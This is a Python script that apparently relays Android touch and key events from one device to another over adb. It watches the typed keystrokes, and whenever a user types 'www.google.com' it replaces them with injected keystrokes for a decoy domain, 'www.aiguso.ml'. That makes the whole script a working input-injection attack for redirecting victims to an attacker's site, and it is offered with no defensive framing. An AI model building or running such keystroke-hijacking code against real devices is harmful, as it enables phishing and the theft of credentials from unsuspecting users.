# coding: utf-8
__author__ = 'fripSide'

import re
import sys
import subprocess

FROM = "192.168.57.101:5555"
TO = "192.168.57.102:5555"
GETEVENT = "adb -s {} shell getevent -tt"
SENDEVENT = "adb -s {} shell sendevent {} {} {} {}"

key_offset = 16
lkc_key_map = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 'ENTER', 'L CTRL', 'a', 's',
                   'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 'L SHIFT', '\\', 'z', 'x', 'c', 'v',
                   'b', 'n', 'm', ',', '.', '/']
KEY_BACKSPACE = 14
REAL_URL = "www.google.com"
DECOY_URL = "www.aiguso.ml"

EV_NUM = re.compile("")

events = []

def play(commands):
    for cmd in commands:
        nc = [str(c) for c in cmd]
        sc = SENDEVENT.format(TO, *nc)
        print(sc)
        subprocess.check_call([sc], shell=True)

def get_char(code):
    if 15 < code < 54:
        c = lkc_key_map[code - key_offset]
        if len(c) == 1:
            print(code, c)
            return c
    return ""

def parser_key_str(cmds):
    s = ""
    for cmd in cmds:
        ev, tp, code, val = cmd
        if code == KEY_BACKSPACE:
            s = s[:-1]
        elif tp == 1 and val == 1:
            s += get_char(code)
    return s

def translate(cmds):
    # linux key code translate
    # replace www.google.com to https://www.aiguso.ml/
    """
    type: 0 EV_SYN, 1 EV_KEY, 3 EV_ABS
    code: ABS_MT_PRESSURE, ...
    value: 1 DOWN, 0 UP
    1 330 1 # 开始点击
    0 2 0
    0 0 0

    1 330 0 # 点击结束
    0 2 0
    0 0 0
    """
    ev = cmds[0][0]
    res = []
    n = 0
    for c in DECOY_URL:
        v = 16 + lkc_key_map.index(c)
        res.append([ev, 1, v, 1])
        res.append([ev, 0, 0, 0])
        res.append([ev, 1, v, 0])
        res.append([ev, 0, 0, 0])
    while n < len(cmds):

        n += 1

    res.append([ev, 1, 28, 1])
    res.append([ev, 0, 0, 0])
    res.append([ev, 1, 28, 0])
    res.append([ev, 0, 0, 0])
    # print(cmd)
    return  res

def record():
    cmd = GETEVENT.format(FROM)
    print(cmd)
    rp = subprocess.Popen([cmd], stdout=subprocess.PIPE, shell=True)
    # rp.communicate()
    cmds = []
    typing = False
    while rp.poll() is None:
        output = rp.stdout.readline()
        tokens = output.split()
        if tokens[0] == "[":
            # print(output)
            ev = tokens[2][:-1]
            tp, code, val = map(lambda x: int(x, 16), tokens[3:])
            if val == 4294967295:
                val = -1
            t = [ev, tp, code, val]
            cmds.append(t)
            if tp == 1 and val == 1 and code != 330 and code != KEY_BACKSPACE:
                typing = True
            if tp == 1 and val == 0 and code == 28:
                s = parser_key_str(cmds)
                print(s)
                if s == REAL_URL:
                    cmds = translate(cmds)
                typing = False

            if not typing:
                play(cmds)
                cmds = []

if __name__ == "__main__":
    try:
        f = sys.argv[1]
        t = sys.argv[2]
    except:
        f = FROM
        t = TO
    finally:
        FROM = f
        TO = t
    record()